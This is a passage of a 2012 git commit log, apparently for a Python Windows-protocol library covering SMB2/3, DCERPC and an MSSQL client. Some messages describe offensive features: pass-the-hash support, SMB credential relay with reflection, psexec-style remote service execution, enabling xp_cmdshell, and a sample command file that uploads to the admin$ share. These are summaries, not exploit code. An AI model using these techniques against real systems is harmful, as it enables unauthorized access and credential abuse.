Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 16 19:18:18 2012 +0000

    connect tree path must have be UNC like for Windows 8 to like it

commit 3f7e5da9a98d2dd7e5bcd97e7e7405311bcb47f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 16 00:29:15 2012 +0000

    StructureSize must be 25 for SessionSetup, if we want Windows 8 to be happy.
    
    So far it can authenticate.. still pending all the new SMB3 signing stuff

commit f69673c59696528d072b98336284fa5a96fb3a31
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 23:52:50 2012 +0000

    Putting all this stuff separate. we should take it all of from smb.py (not yet)

commit 964d3f208c4f729d6002e7d4845894db5e898344
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 22:57:06 2012 +0000

    Updated info

commit 80b5580dfa9a79e686d7f023aa3284e7d6feaaaf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 22:53:45 2012 +0000

    1) Added waitNamedPipe()

commit 93026c2982de8fbbfe89e5809ed67c66a7ac39f9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 21:49:44 2012 +0000

    Forgot to remove the other pair of the share inside self._Session['TreeConnectTable']

commit fb55dac69082c68f0f36246e7162443d1c2f8654
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 20:01:43 2012 +0000

    1) oopps! forgot to deep copy the TREE_CONNECT, OPEN and FILE dicts
    2) set_timeout() added
    3) working on nt_create_andx when cmd is sent

commit 0fc0a1fda1ea0c7d642add524229dc71146a77f9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 18:08:21 2012 +0000

    1) Added stor_file()
    For testing purposes.. smbclient should work with SMB2/3 with you change the do_open() to:
            self.smb = smb3.SMB3(remote_name, host, sess_port=int(port))

commit b24b15a99358f4d8baa2649588767f0cd8103576
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 17:21:26 2012 +0000

    1) Added SMB_QUERY_INFO call
    2) Added retr_file()
    3) Added open_andx() in the backward compatibility section

commit 0b253b8509b42c525250157ac444fe5eeee86493
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 17:15:57 2012 +0000

    when retrieving a file, don't create the file with a full pathname, just in the current dir.

commit 538a0bb17a51c2401c2e443d76c237273f0a2a3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 15:05:11 2012 +0000

    When doing CD, check the directory actually exists

commit 202b0ef4139c412cf2b1d1d91281f24ed2284014
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 13:58:01 2012 +0000

    One more use of ntpath

commit 5615c25457f8fd6d1cde6a691cb82d871ca1df5a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 03:26:29 2012 +0000

    1) Added mkdir(), rmdir()
    2) If connecting to a tree that is already connected, don't connect again, just return the treeId

commit 67597966608afb38a00cf319e52d67f90e48fef1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 03:07:45 2012 +0000

    Using ntpath to join directories, much safer and clean

commit f927429eddb2ba18114a1f47bae592be8826ce3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 01:22:04 2012 +0000

    Added list_path()

commit 275c011a4542c1e6b0e0b3b64a32367bdb5628a9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 00:53:32 2012 +0000

    SMBFindFileNamesInfo() has now a UnicodeType as well

commit d123563013e08c8be3316126ccbe5dabe39f8ff1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 14 23:47:36 2012 +0000

    1) Added isGuestSession()
    2) Added getServerIP()
    3) Backward compatible list_shared(), connect_tree, get_remote_host

commit 19840a88b2db384394de4dbc387fc886f8b79817
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 14 23:21:48 2012 +0000

    Initial implementation of SMB version 2 and 3 protocol [MS-SMB2].
    1) Signing support for SMB2 done (SMB3 not yet, as well as encryption)
    2) Commands implemented:
    SMB2_NEGOTIATE
    SMB2_SESSION_SETUP
    SMB2_LOGOFF
    SMB2_TREE_CONNECT
    SMB2_TREE_DISCONNECT
    SMB2_CREATE
    SMB2_CLOSE
    SMB2_FLUSH
    SMB2_READ
    SMB2_WRITE
    SMB2_LOCK
    SMB2_IOCTL
    SMB2_CANCEL
    SMB2_ECHO
    SMB2_QUERY_DIRECTORY
    3 left to go.
    3) DCERPC over SMB2 should work, if you change smb.SMB for smb3.SMB3 in transport (and import smb3)
    
    We'll do a SMB protocol factory in the future to make it all transparent to the user.

commit 2552e57fed56433c141fa77b9d98bb8e011d88b8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 14 22:49:24 2012 +0000

    Added TransactNamedPipeRecv() to smb.py as it's being used by transport.py. This is to isolate anything related to SMB1 from the DCERPC layer... (guess why? :P )

commit 0d76f992ce02c3e8500bd60f6f4f6c065a922e93
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 13 18:44:04 2012 +0000

    Forgot to remove the higher bits on the lower side of length field

commit 6b0b2eec7fd2c841b8d2f6f79d1b4be740ba24a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 13 17:01:23 2012 +0000

    For NETBIOS_SESSION_MESSAGE the size of the message is 3 bytes long, using the flags byte

commit 04f6b3256049183b1150943f428507ae883a5291
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 11 16:49:49 2012 +0000

    Just ordering the imports

commit 68a36eb68a578ee1d88bcacaf5722da3b1188458
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 9 16:56:32 2012 +0000

    Binary compiled with VC2008 so it can work on Windows 2000 boxes

commit a1329d587172dba033653da58e7975772cd03872
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 9 16:54:12 2012 +0000

    Sleeps while waiting for the pipe to be ready. Set a max tries of 50

commit f5c72ebb022f3095508b86041baf1181ccacf6dc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 9 16:21:28 2012 +0000

    Increased the amount of bytes substracted for chunk_size to make it safer, doesn't look like it was enough for Windows 2000

commit 17870a41e3657b38ce220cabd1c7732991c96e8c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 7 14:30:07 2012 +0000

    If we know the serverName, use it for the path to the service, if not, just stick 127.0.0.1 and hope for the best.

commit 9ab7ae576e5bdbed7e2ce72f99279e3192fc6f00
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 6 21:49:56 2012 +0000

    Added -file option.. allowing to upload an specific RemComSVC compatible file

commit c6a052224f6d1130ff93bdc485c067935b9209e8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 4 19:36:18 2012 +0000

    Now it also print the Interface Provider (the exe/dll file holding the typedef)

commit 9dc37f96af6b6fa4eeb001b24837528aaa041ef8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 4 19:35:30 2012 +0000

    Updated KNOWN_UUIDS

commit d578b42a1c9d8b860b7d7cd54157776c4999811e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 3 14:01:11 2012 +0000

    A few more UUIDS

commit 4b0ff106fd3eb21ea6a7e80d569689abb4e794cd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 2 12:16:43 2012 +0000

    More updates on the KNOWN_PROTOCOL dict

commit b3eb3eaf9ab6df033015ddef038c08df16fd33a4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 1 19:28:52 2012 +0000

    A much better way to show and endpoint mapper output (IMHO). Now grouped by the Interface IDs

commit be278a142fcc1c4845c6cdd191db2861806e8bb4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 1 17:55:02 2012 +0000

    It now shows the protocol associated with the Interfase ID, if possible

commit 8b10b7920c2bebec6d6b3b4c24190e7a9e5c22bd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 1 17:52:49 2012 +0000

    Added KNOWN_PROTOCOLS dictionary.. I parsed all the Windows Protocol Specification looking for the UUIDs used. This could be helpful when reading a portmap output

commit 703a6815cf20652364bcde87c6e8e597eadb3f86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 31 22:05:14 2012 +0000

    A simpler and faster version of rpcdump, using the new lookup call

commit 182545a341cb4bbfc35f8ff48966360ee7dd757a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 31 18:32:59 2012 +0000

    pump up version to 1.0-dev

commit 8eff6ce2722924c527796a555a8773c4b8090da2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 31 17:27:56 2012 +0000

    Forgot to remove forcing inquireType to be all endpoints.. now it honors the method parameter

commit 437091d68db03d1216f7f939ee2f69ba09f146b8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 30 23:40:39 2012 +0000

    PrintStringBinding() method added.. basically same code we had before but converted to Structure like code

commit 66793d1f1f7a53ce735f008e88377e49f55be54e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 30 22:15:28 2012 +0000

    Added portmap lookup function using Structure. It can work as a general portmapper, or just to find specific interfaces/objects.
    But most important, it doesn't grab records one at a time (as the previous implementation), but get them all and the parses the results. Way faster than before.
    Old code left there for backward compatibility.
    Still gotta finishing printing friendly the results

commit f8dcd5514a23eb4a9e47ee8c628b6ff4c9294161
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 30 19:54:19 2012 +0000

    Some clarification comments based on [MS-RPCE]

commit ac130e8bf0bf0b7bf98e7618d9f4420f9fd537b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 26 22:18:33 2012 +0000

    1) Fix bug when passing hashes, there weren't being converted to binary hence it wasn't working

commit 7e422881d578484d94b9ee05d46e3a0f5f504990
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 24 16:43:04 2012 +0000

    [MC-SQLR] example. Retrieves the instances names from the target host

commit 2e692c3cfb4105811e066983049ba71c3baf5a1f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 23 18:05:18 2012 +0000

    Added commands to the shell:
    1) lcd {path}                 - changes the current local directory to {path}
    2) enable_xp_cmdshell         - you know what it means
    3) disable_xp_cmdshell        - you know what it means
    4) xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    5) ! {cmd}                    - executes a local shell cmd
    
    Just to show what can be done..

commit 6c37c911075b748d97b0f6852e52930ed6c55237
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 23 17:59:25 2012 +0000

    1) Changed printRows, now it mimics what a osql client does ( I don't know if I like it more or less)
    2) ENVCHANGE now specifies what changed (DATABASE, PACKET SIZE, ETC)
    3) Added new types, dates should be shown well now.. decimal as well. Only important one left is SQLVariant

commit 47f51877eaa8367f5af2e2623b147564ab1390be
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 22 18:20:28 2012 +0000

    Now it shows TDS_NUMERICNTYPE most of the times :)

commit 1a0ed117f1a08b98d356a32508303d9beb99b144
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 23:08:49 2012 +0000

    Added -file option to specify a file with commands

commit 6a8373c79501f89febe82bbb1ae02ed2dd6af4f7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 22:56:55 2012 +0000

    Fixed bug in NTEXTTYPE, weren't adding the right amount of bytes to advance in the buffer (2 instead of 4)

commit 7c45e66a86fc174a2c8fe6856ead554b537c4a18
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 22:42:28 2012 +0000

    Added TDS_NUMERICNTYPE parse in parseRow(), still have to print it the right way. Now just printing a warning message

commit 8dde582908d9db9d1cff5cc09d3ba84574cff9e0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 21:38:10 2012 +0000

    Don't get into the SQL Shell if auth failed

commit 205135a8bb8a1c403b89eb18189f71b1c06165ad
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 01:44:01 2012 +0000

    self.colMeta must be clean every time we parse colMetaData

commit 644c6cb52ba8d4d6b1abf410ec3c55c238e14cf6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 01:21:29 2012 +0000

    TDS_NUMERICNTYPE size is just 1 byte (inside parseRow)

commit 73fa99559391f2cde06fad1e7b8a807823e8833d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 00:09:28 2012 +0000

    GUIDs can be NULL :s

commit 89484cdfe2f90874eee7fb383a70cd1260891ffd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 21 00:04:43 2012 +0000

    Added TDS_RETURNSTATUS_TOKEN and TDS_DONEPROC_TOKEN

commit dfeaa4e75ad891560abf5e189da072b85541db41
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 23:53:06 2012 +0000

    Support for TDS_GUIDTYPE in parseRow

commit 9c52f905279db165969d8204705b2bd472f322a1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 23:40:40 2012 +0000

    Oops.. w/o printing the error

commit c2594c95f2c03736bec07a1635a011fb9c35abe7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 23:39:51 2012 +0000

    Don't exit if something goes wrong

commit cba4a5862e5d1703071e7742f267f7d2713c4fc6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 20:53:05 2012 +0000

    Windows auth by default is False

commit 931a714a65d6b3973e6f5bb7cc303eccab936d00
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 20:51:48 2012 +0000

    A simple MSSQL client

commit 6a741a350aeeb321e258ffbcb500521ca1c19a7c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 20 20:50:25 2012 +0000

    Initial implementations of the TDS protocol so we can talk with a target MSSQL Server.
    It supports MSSQL and Windows Auth.
    See the mssqlclient.py under the examples

commit 1dca21e47ca242c584cc099a17a948912a2da023
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 18 13:13:22 2012 +0000

    Updated setup.py

commit 7bbd07faa998cf279a6e6af21ec48a0ef29be425
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 18 13:11:10 2012 +0000

    Clarifications on the need of using the srvsvcserver

commit 0b71d0e80de3e72f2b4ed537060ab717d0d409f6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 15 19:25:01 2012 +0000

    Support for large files in READ_ANDX and WRITE_ANDX

commit 08ea2274a7043b62d778a8e32867dd3a1a8b9492
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 15 06:26:46 2012 +0000

    Added -file command line option allowing to specify a file with commands to execute. E.g.
    cat > cmds.txt
    open 192.168.53.146
    login user1 pwd1
    shares
    use admin$
    cd Web
    cd Wallpaper
    ls
    put myfile
    
    python smbclient.py -file cmds.txt

commit 0e862171aa7c401e5deea0016bb3f53e40c853a7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 15 03:00:54 2012 +0000

    Exposing a getShare() method used by psexec

commit 9f0021ff277f08daf6000943060e92e2dc13abff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 15 02:59:58 2012 +0000

    Ability to download/upload files from the shell session. Could be kind of confusing at first but I'm sure it's gonna be useful to somebody :P

commit 66db493223f9d27b431dd0f1975569748d0b6874
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 14 23:53:54 2012 +0000

    Now smbrelayx uses serviceinstall helper library... Much simpler

commit 5d74ec93796baf422c47f36993804cb3635ec2dc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 14 23:07:54 2012 +0000

    IPv6 ping example

commit c9b8411586d2cf3e89c5188cbb2c694c7aabe7a7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 14 15:54:14 2012 +0000

    Under some circumstances, opening multiple simultaneous connections to the target host might make the server to reset some of them. Looks like opening them sequentialy solves this problem. I added a lock on each thread so once they release the lock lets the next one opening the next connection. This seems to solve this rare issue

commit da57bdc4d5b33997a54e4f9560513573a2f3cfb9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 13 19:40:41 2012 +0000

    Added a RemoteShell class that allows implementing some commands on top of the shell being running (currently only lcd and '!').
    
    Better control of some error situations.

commit 0863f23a244526343ed26134537eb0d2899f1d19
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 12 16:33:04 2012 +0000

    Don't fail if we don't specify a credentials file (we're not using it right now)

commit 26515dd76df20cc1fb657d0d76650f5bfa0033ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 12 16:22:04 2012 +0000

    In the situation where something fails inside a try:.. finally will get the wrong tid, setting to the correct one

commit 97817fc1d10e9a20a1a09a58459cc09d756fc1b1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 23:54:59 2012 +0000

    1) Parameters are parsed with argparse
    2) Added domain and hashes support

commit c987cf7d1439aa8b40244368defd2b64309500e5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 19:39:46 2012 +0000

    Removed debug msg

commit 8bf973f914effc1e54aebc613fa663398c3a2a21
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 19:39:14 2012 +0000

    1) Parameters are parsed with argparse
    2) Added domain and hashes support

commit 02f502b266739ea475f76780863bd3cb9c0fc70b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 19:12:55 2012 +0000

    1) Parameters are parsed with argparse
    2) Added domain and hashes support

commit 5405bb444113dc330f5c418f399d3dd34fd7f74e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 17:51:30 2012 +0000

    1) Catches exception when connecting and exiting gracefully
    2) Threads honor the destination port given by the user (either 445 or 139)

commit 0e181e400b9b5166eba966f8ab376b7ec209a358
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:55:44 2012 +0000

    Showing help by default

commit 7c1e7b40efeacc760652d2078af0b8f2e1f8baa5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:48:20 2012 +0000

    Showing help by default. Default transport is 445/SMB

commit 4120e1178808a316b838cda27ff66e50363f721c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:45:20 2012 +0000

    Showing help by default. Default transport is 445/SMB

commit 557943ab22f83f9b473cce92373fba41bfbc571f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:42:50 2012 +0000

    Showing help by default. Default transport is 135/TCP

commit 3bc1bfe317a76317b02c277d3dc91ebd0a0001b1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:37:01 2012 +0000

    psexec like example using RemComSvc (https://github.com/kavika13/RemCom)

commit 0ab8226c9b412926420f7f3858e015c3ebc3bc6a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 11 16:34:47 2012 +0000

    These are helpers to be used by the examples provided.
    
    remcomsvc: delivers the binary of the remcomsvc to be used for remote execution
    serviceinstall: helper to install/uninstall services

commit cc630748b93c49ad0f3c3b43c3e9d8850d903f8c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 10 14:16:54 2012 +0000

    Added domain and hashes support

commit 821cef87b7f4faae3480143606fe31cee2ce4f1a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 10 14:09:48 2012 +0000

    Added domain and hashes support

commit f45d28d4cdae235f9aa7e4aef6a56e24740e5c05
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 10 13:58:10 2012 +0000

    Added domain and hashes support

commit 2c8a5bf41302e6289d0ea3c2fb803da8eadf847c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 8 22:19:26 2012 +0000

    Remaining was wrongly calculated.. the original buffer's size must be there (I had to substract the 2 additional bytes when sending in pipe_mode)

commit c8a651797e44c6f359c03c1af97d2d11a5f605ef
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 8 21:38:17 2012 +0000

    1) MaxBufferSize now set to the recommended by MS-CIFS (61440)
    2) Implemented WaitNamedPipe call
    3) write_andx now supports a write_pipe_mode that requires sticking to MaxBufferSizes besides the capabilities set by the server

commit c6c6a0cd3cee8f64ac5f664d8fbaf2a3deba1bdc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jul 8 04:44:34 2012 +0000

    Fixing padding calculation for NT Transact

commit 734b5cdfd032f25a6f2b6f68c93306efa2cc7d8a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 6 20:36:54 2012 +0000

    1) Putting deprecation warnings on __raw_retr_file and __raw_stor_file methods
    2) Raw methods eliminated from stor_file() and retr_file()

commit 53847d097ca8047e4edc20cf415bb5b8b917c23e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 4 19:49:59 2012 +0000

    Added SMB_FIND_FILE_NAMES_INFO info level to findfirst2

commit 9a2fa5c2424c1df9e9d16d50808a220ee877e1c8
Author: jigermano@gmail.com <jigermano@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 3 20:46:35 2012 +0000

    Added partial support for TCP SACK (support for 1 block only)

commit 5f5bd8b07f486a87aacb014a36e01ab5edae5c92
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 29 19:16:11 2012 +0000

    Service Type can be many types

commit f3b3017e7c6c257c5e98693f39dd0c0738a98644
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 26 16:55:13 2012 +0000

    1) Added use_timeout() context_manager method.
    2) Added deprecation warning for tree_connect(), clients should use tree_connect_andx()

commit 59b931d373e1325ee75e3bdc5fe91bd9f582e12c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 26 12:59:30 2012 +0000

    Better error support and status reporting

commit 99fa62bc2dd7fd2c90a08b7b73eff34472d9f81e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 26 00:42:49 2012 +0000

    No need to have a '-m' switch.. can be infered whether or not a host is specified.

commit c03b0707aa22f7dc690b292daf16dfaaeb36da86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 26 00:31:18 2012 +0000

    Better error support and status reporting

commit a9a0586fe2a765eb0642eac81cea8bd328036dca
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 24 21:27:07 2012 +0000

    1) Added create service option
    2) Arguments' parsing now handled by argparse

commit 5aeb21bf41771586f3434dc57bc3c3793ee5cd31
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 24 19:39:05 2012 +0000

    Using argparse for program's argument parsing

commit 29c06e14650c5b3b69388691196a3191abb7dc50
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 24 06:21:25 2012 +0000

    1) Added reflection mode, to relay credentials to the caller host (fixed in MS08-068)
    2) Program arguments now handled by argparse

commit b236b79627b09b189e55f31ca47a83e4bc204a4b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jun 24 06:17:30 2012 +0000

    Added version file used by the examples

commit 1bcc9010136d3d71f46827baff19e9566b9fe285
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 23 22:17:33 2012 +0000

    Parses a pcap file or sniffes traffic from the net and checks the SMB structs for errors.  Log the error packets in outFile. Still lots to do

commit 55feb029a413ea5de9b68ce50611f18e77838a9e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 23 22:09:30 2012 +0000

    Prints whether or not a USER or GUEST session (SFS) was granted

commit 4b5a523d6f8690f018ce30bea8e72e10d30889f8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 23 22:07:40 2012 +0000

    Added LsarLookupSids3() call

commit b65d75c3950776f9949276e40aa60044b498effb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jun 23 22:06:10 2012 +0000

    Added rpc_fault_cant_perform DCERPC error

commit 91cdd87c4a7d290d35a85c970bf50f484d0c7f08
